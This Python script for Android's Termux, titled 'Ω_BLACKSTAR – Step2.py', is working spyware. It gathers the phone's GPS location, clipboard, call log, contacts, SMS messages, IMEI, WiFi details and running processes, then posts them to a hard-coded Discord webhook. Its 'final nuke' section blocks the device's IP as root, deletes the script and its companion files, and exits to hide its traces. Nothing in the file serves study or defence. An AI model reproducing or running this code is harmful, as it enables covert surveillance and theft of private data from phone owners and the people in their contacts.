import os
import sys
import json
import time
import subprocess
import re
import glob
from datetime import datetime

# ============================================================
# COLORS
# ============================================================
R = '\033[31m'
G = '\033[1;32m'
O = '\033[33m'
B = '\033[34m'
C = '\033[36m'
W = '\033[0m'

# ============================================================
# CONFIG – REPLACE WITH YOUR WEBHOOK
# ============================================================
WEBHOOK_URL = "https://discord.com/api/webhooks/1518322013335191733/aLTB-Fq-N4OEpwkR1YFxlBo_RLxf6KCiPFxvz_UxMhn2rlmqMdkZ3_2orFKIAadD0pj6"

# ============================================================
# DISCORD WEBHOOK
# ============================================================
def send_to_discord(content, file_path=None):
    """Send a message or file to Discord via webhook."""
    try:
        import requests
        if file_path and os.path.exists(file_path) and os.path.getsize(file_path) <= 8 * 1024 * 1024:
            with open(file_path, "rb") as f:
                files = {"file": (os.path.basename(file_path), f)}
                r = requests.post(WEBHOOK_URL, files=files)
            return r.status_code in (200, 204)
        else:
            r = requests.post(WEBHOOK_URL, json={"content": content})
            return r.status_code in (200, 204)
    except ImportError:
        print(f"{R}[!] requests module not found. Installing...{W}")
        subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"])
        import requests
        return send_to_discord(content, file_path)
    except Exception as e:
        print(f"{R}[!] Webhook error: {e}{W}")
        return False

# ============================================================
# TERMUX:API DATA COLLECTION
# ============================================================
def run_termux_command(cmd, timeout=10):
    """Run a termux-api command and return output."""
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        if result.returncode == 0:
            return result.stdout.strip()
        return None
    except subprocess.TimeoutExpired:
        print(f"{O}[!] Command timed out: {' '.join(cmd)}{W}")
        return None
    except Exception as e:
        print(f"{R}[!] Error running {' '.join(cmd)}: {e}{W}")
        return None

def get_battery_status():
    """Get battery status using termux-battery-status."""
    output = run_termux_command(["termux-battery-status"])
    if output:
        try:
            data = json.loads(output)
            return f"Percentage: {data.get('percentage', 'N/A')}%\nStatus: {data.get('status', 'N/A')}\nTemperature: {data.get('temperature', 'N/A')}°C"
        except:
            return output
    return "N/A"

def get_location():
    """Get GPS location using termux-location."""
    output = run_termux_command(["termux-location"], timeout=15)
    if output:
        try:
            data = json.loads(output)
            return f"Latitude: {data.get('latitude', 'N/A')}\nLongitude: {data.get('longitude', 'N/A')}\nAltitude: {data.get('altitude', 'N/A')}\nAccuracy: {data.get('accuracy', 'N/A')}m"
        except:
            return output
    return "N/A"

def get_clipboard():
    """Get clipboard content using termux-clipboard-get."""
    output = run_termux_command(["termux-clipboard-get"])
    if output:
        return output
    return "N/A"

def get_call_log():
    """Get call log using termux-call-log."""
    output = run_termux_command(["termux-call-log"])
    if output:
        try:
            data = json.loads(output)
            entries = data.get("items", [])[:10]
            result = "Recent Calls:\n"
            for entry in entries:
                result += f"  {entry.get('number', 'Unknown')} | {entry.get('type', 'Unknown')} | {entry.get('duration', 'N/A')}s\n"
            return result
        except:
            return output[:500]  # Truncate if not JSON
    return "N/A"

def get_contacts():
    """Get contacts using termux-contact-list."""
    output = run_termux_command(["termux-contact-list"])
    if output:
        try:
            data = json.loads(output)
            entries = data[:10]
            result = "Contacts (first 10):\n"
            for entry in entries:
                name = entry.get('name', 'Unknown')
                number = entry.get('number', 'N/A')
                result += f"  {name}: {number}\n"
            return result
        except:
            return output[:500]
    return "N/A"

def get_sms_list():
    """Get SMS messages using termux-sms-list."""
    output = run_termux_command(["termux-sms-list", "-l", "5"])  # Last 5 messages
    if output:
        try:
            data = json.loads(output)
            entries = data[:5]
            result = "Recent SMS:\n"
            for entry in entries:
                address = entry.get('address', 'Unknown')
                body = entry.get('body', '')[ :50]
                result += f"  From {address}: {body}...\n"
            return result
        except:
            return output[:500]
    return "N/A"

def get_device_info():
    """Get device information using termux-telephony and other methods."""
    info = []
    
    # Try to get telephony info
    output = run_termux_command(["termux-telephony"])
    if output:
        try:
            data = json.loads(output)
            info.append(f"IMEI: {data.get('imei', 'N/A')}")
            info.append(f"Device ID: {data.get('device_id', 'N/A')}")
            info.append(f"Network: {data.get('network_operator_name', 'N/A')}")
            info.append(f"Sim Operator: {data.get('sim_operator_name', 'N/A')}")
            info.append(f"Phone Type: {data.get('phone_type', 'N/A')}")
        except:
            info.append(output[:200])
    
    return "\n".join(info) if info else "N/A"

def get_wifi_info():
    """Get WiFi info using termux-wifi-connectioninfo."""
    output = run_termux_command(["termux-wifi-connectioninfo"])
    if output:
        try:
            data = json.loads(output)
            return f"SSID: {data.get('ssid', 'N/A')}\nBSSID: {data.get('bssid', 'N/A')}\nSignal: {data.get('rssi', 'N/A')} dBm\nFrequency: {data.get('frequency', 'N/A')} MHz"
        except:
            return output
    return "N/A"

def get_sensor_info():
    """Get sensor info using termux-sensor."""
    output = run_termux_command(["termux-sensor", "-l"], timeout=15)
    if output:
        try:
            data = json.loads(output)
            result = "Sensors:\n"
            for sensor, values in list(data.items())[:5]:
                result += f"  {sensor}: {values}\n"
            return result
        except:
            return output[:300]
    return "N/A"

# ============================================================
# SYSTEM & NETWORK INFO
# ============================================================
def get_public_ip():
    """Get public IP address."""
    try:
        import requests
        r = requests.get("https://api.ipify.org?format=json", timeout=5)
        return r.json().get("ip", "unknown")
    except:
        return "unknown"

def get_local_ip():
    """Get local IP address."""
    try:
        result = subprocess.run(["ifconfig"], capture_output=True, text=True)
        for line in result.stdout.splitlines():
            if "inet " in line and "127.0.0.1" not in line:
                parts = line.strip().split()
                for i, part in enumerate(parts):
                    if part == "inet" and i + 1 < len(parts):
                        ip = parts[i + 1]
                        if ip.startswith(("192.168.", "10.", "172.")):
                            return ip
        return None
    except:
        return None

def get_running_processes():
    """Get running processes using ps command."""
    try:
        result = subprocess.run(["ps", "aux"], capture_output=True, text=True, timeout=10)
        lines = result.stdout.splitlines()
        return "\n".join(lines[:20]) + (f"\n... and {len(lines)-20} more" if len(lines) > 20 else "")
    except:
        return "N/A"

def get_storage_usage():
    """Get storage usage using df command."""
    try:
        result = subprocess.run(["df", "-h"], capture_output=True, text=True)
        return result.stdout.strip()
    except:
        return "N/A"

# ============================================================
# IP BLOCKING (FINAL NUKE)
# ============================================================
def block_ip_iptables(ip):
    """Block an IP address using iptables (requires root)."""
    if not ip:
        print(f"{R}[!] No IP to block.{W}")
        return False
    
    print(f"{C}[*] Attempting to block IP: {ip}{W}")
    
    # Check if root is available
    try:
        subprocess.run(["su", "-c", "echo test"], capture_output=True, timeout=5)
    except:
        print(f"{R}[!] Root not available. Skipping IP block.{W}")
        return False
    
    # Try to block with iptables
    try:
        # Add REJECT rule for OUTPUT chain
        cmd = f"iptables -I OUTPUT -d {ip} -j REJECT"
        result = subprocess.run(["su", "-c", cmd], capture_output=True, text=True, timeout=10)
        if result.returncode == 0:
            print(f"{G}[+] IP {ip} blocked successfully via iptables.{W}")
            return True
        else:
            print(f"{R}[!] iptables block failed: {result.stderr}{W}")
            return False
    except Exception as e:
        print(f"{R}[!] IP block error: {e}{W}")
        return False

def block_ip_hosts(ip):
    """Block an IP address by adding to /etc/hosts (requires root)."""
    if not ip:
        return False
    
    try:
        # Add entry to /etc/hosts pointing to localhost
        entry = f"127.0.0.1 {ip}\n"
        # Check if already present
        result = subprocess.run(["su", "-c", "cat /etc/hosts"], capture_output=True, text=True)
        if ip in result.stdout:
            print(f"{O}[!] IP {ip} already in /etc/hosts{W}")
            return True
        
        # Append to /etc/hosts
        cmd = f"echo '{entry}' >> /etc/hosts"
        subprocess.run(["su", "-c", cmd], capture_output=True, text=True, timeout=5)
        print(f"{G}[+] IP {ip} added to /etc/hosts{W}")
        return True
    except Exception as e:
        print(f"{R}[!] /etc/hosts block failed: {e}{W}")
        return False

# ============================================================
# SELF-DESTRUCT & CLEANUP
# ============================================================
def self_destruct():
    """Delete the script and related files."""
    print(f"{C}[*] Self-destruct sequence initiated...{W}")
    
    # Get the current script path
    script_path = os.path.abspath(sys.argv[0])
    script_dir = os.path.dirname(script_path)
    
    # Files to delete (Step1, Step2, logs, etc.)
    files_to_delete = [
        script_path,
        "Step1.py",
        "Step2.py",
        "nmap_scan.txt",
        "*.log",
        "*.tmp",
        "*.cache"
    ]
    
    # Also delete the blocklist file if it exists (from Step1)
    blocklist_files = glob.glob(os.path.expanduser("~/.ipgrabber_blocked.txt"))
    files_to_delete.extend(blocklist_files)
    
    # Delete files
    for pattern in files_to_delete:
        try:
            for f in glob.glob(pattern):
                if os.path.exists(f):
                    os.remove(f)
                    print(f"{G}[+] Deleted: {f}{W}")
        except Exception as e:
            print(f"{O}[!] Could not delete {pattern}: {e}{W}")
    
    # Try to delete the directory if empty
    try:
        if script_dir and script_dir != os.path.expanduser("~"):
            os.rmdir(script_dir)
            print(f"{G}[+] Removed directory: {script_dir}{W}")
    except:
        pass
    
    print(f"{R}[!] Self-destruct complete. Goodbye.{W}")
    
    # Force exit
    os._exit(0)

# ============================================================
# MAIN
# ============================================================
def main():
    print(f"\n{C}{'='*60}{W}")
    print(f"{C}Ω_BLACKSTAR – Step2.py Expansion{W}")
    print(f"{C}{'='*60}{W}\n")
    
    # Collect all data
    print(f"{C}[*] Collecting device data via Termux:API...{W}")
    
    data = {
        "timestamp": datetime.now().isoformat(),
        "public_ip": get_public_ip(),
        "local_ip": get_local_ip(),
        "battery": get_battery_status(),
        "location": get_location(),
        "clipboard": get_clipboard(),
        "call_log": get_call_log(),
        "contacts": get_contacts(),
        "sms": get_sms_list(),
        "device_info": get_device_info(),
        "wifi": get_wifi_info(),
        "sensors": get_sensor_info(),
        "processes": get_running_processes(),
        "storage": get_storage_usage()
    }
    
    # Build report
    report = "📊 **Step2.py – Data Collection Report**\n\n"
    for key, value in data.items():
        if value and value != "N/A":
            report += f"**{key}**:\n```\n{value[:500]}\n```\n\n"
    
    # Send to Discord
    print(f"{C}[*] Sending data to Discord...{W}")
    send_to_discord(report)
    
    # Also send as file if too long
    if len(report) > 1900:
        with open("report.txt", "w") as f:
            f.write(report)
        send_to_discord("📄 Full report attached.", "report.txt")
        try:
            os.remove("report.txt")
        except:
            pass
    
    print(f"{G}[+] Data sent to Discord.{W}")
    
    # ============================================================
    # FINAL NUKE – Block IP and Self-Destruct
    # ============================================================
    print(f"\n{R}{'='*60}{W}")
    print(f"{R}☢️  FINAL NUKE SEQUENCE INITIATED ☢️{W}")
    print(f"{R}{'='*60}{W}\n")
    
    # Get IP to block
    ip_to_block = data.get("public_ip") or get_public_ip()
    if ip_to_block and ip_to_block != "unknown":
        print(f"{C}[*] Attempting to block IP: {ip_to_block}{W}")
        
        # Try iptables first (requires root)
        if block_ip_iptables(ip_to_block):
            send_to_discord(f"🚫 **IP Blocked**: {ip_to_block} (iptables)")
        else:
            # Fallback to /etc/hosts
            if block_ip_hosts(ip_to_block):
                send_to_discord(f"🚫 **IP Blocked**: {ip_to_block} (/etc/hosts)")
            else:
                send_to_discord(f"⚠️ **IP Block Failed**: {ip_to_block}")
    else:
        print(f"{O}[!] No valid IP to block.{W}")
    
    # Send final message
    send_to_discord("💀 **Self-Destruct Sequence Complete**")
    
    # Wait a moment then self-destruct
    print(f"\n{C}[*] Self-destruct in 3 seconds...{W}")
    time.sleep(3)
    
    self_destruct()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{R}[!] Interrupted.{W}")
        sys.exit(1)
    except Exception as e:
        print(f"\n{R}[!] Fatal error: {e}{W}")
        sys.exit(1)
